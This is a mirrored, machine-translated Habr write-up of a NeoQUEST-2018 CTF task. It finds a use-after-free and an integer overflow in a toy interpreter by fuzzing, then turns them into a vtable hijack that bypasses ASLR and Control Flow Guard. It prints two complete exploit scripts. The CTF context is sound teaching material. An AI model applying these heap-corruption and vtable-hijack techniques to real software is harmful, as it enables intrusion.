<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Pwn iNt All! We find vulnerabilities in scripting engines and open usermode-mechanisms for protecting Windows. Part 1</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Operating systems are a delicate matter. And very secure! To bypass their defense mechanisms is a complicated and time-consuming business, even a bit ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Pwn iNt All! We find vulnerabilities in scripting engines and open usermode-mechanisms for protecting Windows. Part 1</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/webt/k-/ao/-i/k-ao-ii8wj90eiuvve9lgf_tree.jpeg"></div><br>  Operating systems are a delicate matter.  And very secure!  To bypass their defense mechanisms is a complicated and time-consuming business, even a bit like magic.  But they say that the son of my mother's friend has already found several <a href="https://ru.bmstu.wiki/RCE_(Remote_Code_Execution)">RCE vulnerabilities</a> , wrote an exploit, and bypassed all the defense mechanisms.  We will try and we! <br><br>  Let's do it on the example of task number 11 from the past <a href="https://neoquest.ru/2018/">NeoQUEST-2018</a> .  The task is realistic - consider a ‚Äúlive‚Äù script of remote code execution, similar to the one that occurs during the operation of Javascript engines in browsers.  We will look for vulnerabilities in some interpreter, implement them to get an ARW-primitive, and as a result we will bypass the protection of the Windows user-mode OS.  The task turned out to be extremely <s>difficult and</s> interesting, therefore we will dedicate to it a whole cycle of articles with a detailed description of the path to success. <br><br>  According to legend, we have a <a href="https://yadi.sk/d/ft2ND5n03UaL9Z">binary</a> program, as well as the address where this service runs.  It is also mentioned that the first step to success is a certain ‚Äúkey‚Äù function. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      So let's get started! <br><a name="habracut"></a><br><h2>  <b>"Key" search</b> </h2><br>  Consider the original data.  The target program is a kind of command interpreter for working with three data types: numbers, vectors, and matrices.  Use the help command - this will give us an idea of ‚Äã‚Äãthe set of supported commands.  The interpreter allows you to: <br><br><ul><li>  Create variable vectors, matrices, and numbers of various sizes. </li><li>  Reassign and copy variables. </li><li>  To work with individual cells of vectors matrices as with numbers, to perform simple arithmetic operations with them. </li><li>  Search for value in vectors / matrices, find out the type of variable and its value. </li><li>  Create loops with variable boundaries and steps. </li></ul><br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/_y/si/z7/_ysiz7ftwjd6it_-rwehvxnyrcc.jpeg"></div><br><br>  The program is implemented as an infinite command processing loop: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/l4/hq/ij/l4hqijmexti3i0tlh4__oswgzqq.jpeg"></div><br><br>  And each team is represented by a separate regular expression. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/qu/_y/fh/qu_yfh-ir9ywj8tahadvdd-dhka.jpeg"></div><br>  So, in search of the ‚Äúkey‚Äù function, we will check the binary for characteristic strings associated with the word ‚Äúkey‚Äù in all languages ‚Äã‚Äãof the world.  Quickly find the desired fragment: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/pn/gv/cb/pngvcb1ktlhcrquznqd8dyn9nfg.jpeg"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/9u/ae/i4/9uaei4gg4cqdlxl0hh0xtiedfda.jpeg"></div><br><br>  It seems that in the binary key is missing (which is logical, damn it!).  Apparently, the same binary is running on the server, and in the argument string aFirstKeyIs2c7f there is the correct key!  But how to get the contents of a modified string from a remote server? <br><br>  An elementary analysis confirms the fact that the function we found need only be called, and the string with the key will be printed in stdout.  It seems that this function is a virtual method of some class, because: <br><br><ul><li>  In the code, there are no direct calls (direct calls) of this function and stub functions sub_40E120. </li><li>  The call to sub_40E120 lies in the list of allowed from the point of view of the <a href="https://msdn.microsoft.com/ru-ru/library/windows/desktop/mt637065%2528v%3Dvs.85%2529.aspx">Control Flow Guard</a> mechanism, which is typical of virtual methods ‚Äî these methods are called via indirect calls (indirect calls). </li></ul><br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/mz/7v/lm/mz7vlm1pwmuij3famng3uo1euye.jpeg"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/m9/9_/ou/m99_oub6b4xut9auu5zrwciyqdk.jpeg"></div><br><br>  So, the scope of work is clear: it is necessary to learn how to call the desired virtual method in the binary on the server side.  There are two options for the development of events: <br><br><ol><li>  Try to find a legitimate opportunity to call the desired method.  Theoretically, this may be an undocumented possibility of the program. </li><li>  Search for vulnerabilities.  If you find one that allows us to master the magic of executing arbitrary code, then you can easily call the desired method and get the key. </li></ol><br><br>  Where to start? <br><br><h2>  <b>Bookmarks are sweet</b> </h2><br>  First, let's analyze the code for undocumented features.  Apparently, the function of processing the input string does not contain them: the regular expressions used here refer only to the commands listed above.  And there are no direct calls to this function in the code.  Perhaps among the documented commands there are hidden opportunities to indirectly call the ‚Äúkey‚Äù function we need? <br><br>  But no.  Some commands (find, what) contain indirect calls to virtual methods, but it is impossible to influence the choice of the method being called - the offsets in the vtable table are fixed everywhere. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/4f/jd/75/4fjd75g1eap7zclghkjqrawwtsg.jpeg"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ig/q6/ae/igq6aeu5ps7lxt1sg7q3dfjno-k.jpeg"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/-k/le/md/-klemdmismrpdemsmifqa3anv78.jpeg"></div><br><br>  Alas, bad luck!  Now is the time to look for <s>excuses for</s> vulnerabilities that will allow us to call a ‚Äúkey‚Äù function. <br><br><h2>  <b>He who seeks will always find what to look for.</b> </h2><br>  We are programmers at mom, so let's try to write a simple <a href="https://en.wikipedia.org/wiki/Fuzzing">fuzzer</a> that generates random, syntactically correct sets of commands for the interpreter.  Javascript and DOM fuzzers are written on the same principle when searching for vulnerabilities in browsers.  Our fuzzer will generate various command sequences in the hope of ‚Äúdropping‚Äù the interpreter.  The principle of operation of the fuzzer when generating the next sequence of commands is as follows: <br><br><ol><li>  First, a number of variables of various types and sizes are created.  Names and types of variables are saved for later use. </li><li>  Then each command is generated randomly according to the list of available variables: <br><ul><li>  An arbitrary command (without parameters) is selected from the list: the command to create a new variable, an arithmetic operation, an assignment command, the find, print command. </li><li>  Depending on the type of command, arbitrary arguments are added to it.  For example, for the find command, an arbitrary name is selected from the list of available variables + an arbitrary number, which is the second argument.  For an arithmetic operation command, the number of parameters is large (the sign of the operation, variables, indices of vectors and matrices), and each of them is also chosen arbitrarily. </li><li>  The generated command is added to the current sequence.  Since some teams can create new variables and change the type of existing ones, the lists with variables in these cases are updated.  This will allow the use of new / changed variables in the process of generating subsequent commands. </li></ul></li><li>  The interpreter runs under the debugger.  The generated sequence is transmitted to the input of the interpreter.  Possible crashes are recorded when processing transmitted commands. </li></ol><br>  Iii ... Victory!  After launching the fuzzer, we quickly managed to find vulnerable sequences of commands on which the interpreter ‚Äúfell‚Äù.  The result is more than satisfactory - as many as two different vulnerabilities! <br><br><h2>  <b>Vulnerability # 1 (UaF)</b> </h2><br>  After receiving the first sequence and clearing it of unnecessary commands (which do not affect the interpreter‚Äôs fall), we obtain the following Proof-Of-Concept: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/nc/zx/4r/nczx4rzv0xynvr6cogrcnirkfg8.jpeg"></div><br><br>  Let's take a closer look.  Do you recognize?  Before us is a classic vulnerability of type <a href="http://reverse-pub.ru/2016/10/11/%25D0%25B8%25D0%25B7%25D1%2583%25D1%2587%25D0%25B0%25D0%25B5%25D0%25BC-%25D1%2583%25D1%258F%25D0%25B7%25D0%25B2%25D0%25B8%25D0%25BC%25D0%25BE%25D1%2581%25D1%2582%25D1%258C-use-after-free-uaf/">Use-After-Free</a> !  Here is what happens in this sequence of commands: <br><br><ol><li>  A large vector <i>vec</i> and an integer variable <i>intval are created</i> . </li><li>  A copy of the vector <i>vec</i> is created - the variable <i>vec2</i> . </li><li>  The variable <i>vec2 is</i> assigned to a variable of another type (integer). </li><li>  An attempt to work with the source vector <i>vec</i> leads to writing to the freed memory and, accordingly, to the crash of the program. </li></ol><br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/np/bj/rf/npbjrfa01k-mvljhnn4ji76wfgs.png"></div><br><br>  It seems that the interpreter implements the concept of Copy-On-Write, as a result of which the variables <i>vec</i> and <i>vec2</i> contained a reference to the same buffer in memory.  When reassigning one of the variables, the buffer was freed without taking into account the fact that it was referenced in another variable.  After that, the variable <i>vec</i> contained a pointer to the freed memory, and had access to it for reading and writing.  As a result, this vulnerability allows random access to a section of memory in which other program objects may be located. <br><br><h2>  <b>Vulnerability # 2 (Integer Overflow)</b> </h2><br>  The second problem is related to the constructor of the matrix object.  When allocating memory for a numerical array, a check of the width <i>W</i> and the height <i>H of the</i> matrix is ‚Äã‚Äãincorrectly implemented. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/i_/6f/lv/i_6flvudvfdmbmrrnplrreteody.jpeg"></div><br><br>  In the constructor, memory is pre-allocated for <i>W</i> * <i>H</i> integer cells.  If the product <i>W</i> * <i>H</i> was greater than 2 <sup>32</sup> -1, then this results in the allocation of a very small buffer due to the integer overflow.  This can be seen directly in the binary, in the class constructor. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kv/h8/_g/kvh8_gwtdzlpf7tumgjm5rnryc8.jpeg"></div><br><br>  However, the possibility of subsequent access to the cells of this array is determined by the large boundaries of <i>W</i> and <i>H</i> , and not by the overflowing value of <i>W</i> * <i>H</i> : <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/sb/nr/lp/sbnrlpe8cilpfefasmqye0iyfno.png"></div><br><br>  This vulnerability, like the first one, allows reading and writing to memory beyond the permissible limits. <br><br>  Each of the found vulnerabilities allows you to achieve the desired result - to become an RCE-god and execute arbitrary code.  Consider this procedure in both cases. <br><br><h2>  <b>I control you!</b> </h2><br>  The possibility of random access to the free memory in the heap is a strong primitive operation.  It is necessary to use the damaged object <i>vec</i> (the vector in the first case and the matrix in the second) for the controlled modification of some other object in the process heap (let's call it <i>victim</i> ).  By appropriately changing the internal fields of the <i>victim</i> object, we will achieve the execution of an arbitrary code. <br>  First, we understand what are the objects of number, vector and matrix in memory.  Again, we will look at the binary and close to the input command processing function, we will find constructor calls for the corresponding classes.  All of them are the heirs of the base class and have similar constructors.  For example, the vector object constructor looks like this: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/qb/ek/_w/qbek_w1fcyxyzrblwppmex-zup8.jpeg"></div><br><br>  When an object is created, the constructor of the base class is called, then the object's fields are filled in according to its type.  You can see the purpose and order of the fields: the address of the table of virtual functions, the size of the vector, the address of the buffer, the type of object in the form of a numerical identifier. <br>  How to ensure that in the freed memory area accessible by the damaged object <i>vec</i> , the <i>victim</i> variable is found?  We will create new objects in the process heap immediately after bringing the <i>vec</i> object into a damaged state.  And to search for an object that does fall into the freed memory, use the <b>find</b> interpreter <b>command</b> .  Place one of the rare objects in one of the fields of the created objects - a peculiar magic number.  Obviously, the buffer size is best for this, since  it is set directly by the user when creating a new object.  If the search for this value in the buffer of the damaged object <i>vec is</i> crowned with success, then we have found the desired object! <br>  We demonstrate the <i>victim</i> object for both vulnerabilities.  Actions at this stage will differ slightly from each other. <br><br>  In the case of the first vulnerability of the UaF type, the <b>find command</b> searches in a limited area of ‚Äã‚Äãmemory ‚Äî its size coincides with the size of the freed buffer of the <i>vec</i> object.  Object allocation in the heap is performed by the system allocator and is not a deterministic process.  We will select the buffer sizes of the initial object <i>vec</i> and of the created objects so that one of them gets into the right memory for a small number of attempts: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/8i/t9/9w/8it99wsnvlj3ddirqpvb3ekexvi.jpeg"></div><br><br>  Great, we successfully found the victim object ( <i>victim</i> <i>v1</i> in this case)! <br><br>  If you execute the same scenario using the second vulnerability, everything will be somewhat more complicated.  In this case, the search will be potentially carried out in the entire memory, since the width <i>W</i> or the height <i>H of the</i> matrix will be large.  However, if the required number in the immediate vicinity of the buffer is not, then the search cycle will go beyond the boundaries of the memory mapped to the address space.  This will lead to a drop in the interpreter process until the magic number is found.  This problem is solved by allocating a large number of objects in memory - at least one of them will fall into memory directly near the buffer. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/dr/4m/ar/dr4marwmc3ugssmhuef1isfmq7w.jpeg"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/l-/yb/iu/l-ybiukpbohwtajgufsok11o-5c.jpeg"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ay/5z/pz/ay5zpzrcs-_wtfwsdst4he3eppg.jpeg"></div><br><br>  Bingo!  And in this case, we also found the <i>victim</i> object! <br><br>  And now the most interesting thing is to understand how exactly to change the <i>victim</i> object and how to start with it the execution of the code we need.  So, we successfully placed an object of the ‚Äúvector‚Äù class in the released memory.  Schematically, it looks something like this: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/rp/to/ib/rptoibyp7-g9dsihmpbbivnzkzw.png"></div><br><br>  The <i>victim</i> object is located in the heap area accessible to us using the <i>vec</i> object, and we can both read the fields of the <i>victim</i> object and modify them.  We also know the offset of the number bufsize in the buffer of the object <i>vec</i> .  Now modify the <i>victim</i> object as follows: <br><br><ol><li>  Read the address of the vtable table, thereby revealing the executable address in memory (and defeating the ASLR protection). </li><li>  Having studied the interpreter's binary, we find the constant difference between the address of the vtable table for the vector object and the address of the ‚Äúkey‚Äù function.  This will allow you to calculate the address of the ‚Äúkey‚Äù function on the server side: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ar/yh/fu/aryhfurvjfgath39tyxirw1p-as.jpeg"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ni/hc/_y/nihc_ysx-60tnrau3mmit5z9k58.jpeg"></div></li><li>  We form a false table vtable directly in the buffer of the <i>victim</i> object, where we write the address of the key function just calculated. </li><li>  Replace the address of the true vtable table of the <i>victim</i> object with the address false. </li><li>  Call the command what the <i>victim</i> object.  Due to the manipulation of the vtable table, instead of the genuine virtual method, our ‚Äúkey‚Äù function will be called.  Since we are calling the whole function, rather than individual ROP gadgets, the Contol Flow Guard protection doesn‚Äôt prevent the function from being invoked. </li></ol><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/d-/m3/bd/d-m3bdrskade8mhiqbxrzpdt0i0.png"></div><br><br>  This scheme of calling the function we need is identical for both vulnerabilities. <br><br>  We are one step away from success, it remains to put everything together and get the key!  Below we consider both examples. <br>  This is the code of a working exploit for a vulnerability of type Use-After-Free: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/qe/ij/ko/qeijko0tvejcjheu1kuuxon8qie.jpeg"></div><br><br><div class="spoiler">  <b class="spoiler_title">Exploit Code for Use-After-Free Vulnerability</b> <div class="spoiler_text"><pre><code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> vec[<span class="hljs-number"><span class="hljs-number">4096</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> m2:=vec <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> va=<span class="hljs-number"><span class="hljs-number">3</span></span> m2:=va va=find(vec,<span class="hljs-number"><span class="hljs-number">256</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v1[<span class="hljs-number"><span class="hljs-number">256</span></span>] va=find(vec,<span class="hljs-number"><span class="hljs-number">256</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> vtb=<span class="hljs-number"><span class="hljs-number">0</span></span> vtb=va<span class="hljs-number"><span class="hljs-number">-1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> buf=<span class="hljs-number"><span class="hljs-number">0</span></span> buf=va+<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> func=<span class="hljs-number"><span class="hljs-number">0</span></span> func=vec[vtb]<span class="hljs-number"><span class="hljs-number">-1547208</span></span> func=func+<span class="hljs-number"><span class="hljs-number">57632</span></span> v1[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func vec[vtb]=vec[buf] what v1</code> </pre> <br></div></div><br><br>  And so for the Integer Overflow vulnerability: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/9j/p1/bd/9jp1bdeewdvpjelxgeytw0g3_lq.jpeg"></div><br><br><div class="spoiler">  <b class="spoiler_title">Exploit Code for Integer Overflow Vulnerability</b> <div class="spoiler_text"><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> m[<span class="hljs-number"><span class="hljs-number">65537</span></span>][<span class="hljs-number"><span class="hljs-number">65536</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v1[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v2[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v3[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v4[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v6[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v5[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v7[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v8[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v9[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v10[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v11[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v12[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v13[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v14[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v16[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v15[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v17[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v18[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v19[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v20[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v21[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v22[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v23[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v24[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v25[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v26[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v27[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v28[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v29[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v30[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v31[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v32[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v33[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v34[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v35[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v36[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v37[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v38[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v39[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> v40[<span class="hljs-number"><span class="hljs-number">256</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> varr=<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> varc=<span class="hljs-number"><span class="hljs-number">0</span></span> varr=find(m,<span class="hljs-number"><span class="hljs-number">256</span></span>).row varc=find(m,<span class="hljs-number"><span class="hljs-number">256</span></span>).col <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> vtb=<span class="hljs-number"><span class="hljs-number">0</span></span> vtb=varc<span class="hljs-number"><span class="hljs-number">-1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> buf=<span class="hljs-number"><span class="hljs-number">0</span></span> buf=varc+<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> func=<span class="hljs-number"><span class="hljs-number">0</span></span> func=m[varr][vtb]<span class="hljs-number"><span class="hljs-number">-1547208</span></span> func=func+<span class="hljs-number"><span class="hljs-number">57632</span></span> v1[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v2[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v3[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v4[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v5[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v6[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v7[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v8[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v9[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v10[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v11[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v12[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v13[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v14[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v15[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v16[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v17[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v18[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v19[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v20[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v21[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v22[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v23[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v24[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v25[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v26[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v27[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v28[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v29[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v30[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v31[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v32[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v33[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v34[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v35[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v36[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v37[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v38[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v39[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func v40[<span class="hljs-number"><span class="hljs-number">0</span></span>]=func m[varr][vtb]=m[varr][buf] what v1 what v2 what v3 what v4 what v5 what v5 what v6 what v7 what v8 what v9 what v10 what v11 what v12 what v13 what v14 what v15 what v16 what v17 what v18 what v19 what v20 what v21 what v22 what v23 what v24 what v25 what v26 what v27 what v28 what v29 what v30 what v31 what v32 what v33 what v34 what v35 what v36 what v37 what v38 what v39 what v40</code> </pre> <br></div></div><br>  Hooray!  The key is received, and a bonus to it is important information.  It turns out that there is a second key, but it lies in the file next to the binary on the server side.  To solve this problem, it is required to build a ROP chain, which means it will have to bypass the CFG.  But about this - in the next article! <br><br>  And we remind that everyone who completed at least one task on <a href="https://neoquest.ru/timeline.php%3Fyear%3D2018%26part%3D1">NeoQUEST-2018</a> is entitled to a prize!  Check your mail for the presence of a letter, and if suddenly it did not come to you - write to <b>support@neoquest.ru</b> ! </div><p>Source: <a href="https://habr.com/ru/post/353850/">https://habr.com/ru/post/353850/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../353836/index.html">Google Analytics - bypass sampling and collect raw data</a></li>
<li><a href="../353838/index.html">Data Fest 2018: announcement and registration</a></li>
<li><a href="../353842/index.html">Three data centers without seams, or how VTB protects business systems</a></li>
<li><a href="../353844/index.html">DotNext 2018 Piter Conference Program Overview</a></li>
<li><a href="../353848/index.html">What's New in PostgreSQL 11: Embedded Web Search</a></li>
<li><a href="../353852/index.html">Guide to background work in Android. Part 4: RxJava</a></li>
<li><a href="../353854/index.html">How we broke Ceph</a></li>
<li><a href="../353856/index.html">Comparison of LAN scanning tools</a></li>
<li><a href="../353858/index.html">Open free webcast of the conference Mobius 2018 Piter</a></li>
<li><a href="../353862/index.html">Conference SMARTRHINO-2018</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
